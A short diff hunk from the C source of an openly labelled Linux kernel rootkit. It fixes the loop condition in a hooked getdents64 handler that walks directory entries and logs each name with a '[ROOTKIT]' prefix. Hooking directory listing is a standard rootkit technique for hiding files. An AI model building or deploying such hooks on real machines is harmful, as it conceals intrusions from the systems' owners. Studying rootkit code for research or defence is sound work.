@@ -227,7 +227,7 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
     p_dirent_k_it = p_dirent_k;
     l_ret         = l_ret_orig;
 
-    while ((char *)p_dirent_k_it < (char *)p_dirent_k + l_ret || p_dirent_k_it->d_reclen == 0) {
+    while ((char *)p_dirent_k_it < (char *)p_dirent_k + l_ret && p_dirent_k_it->d_reclen != 0) {
         pr_info("[ROOTKIT]   * %s", p_dirent_k_it->d_name);
 
         us_reclen = p_dirent_k_it->d_reclen;
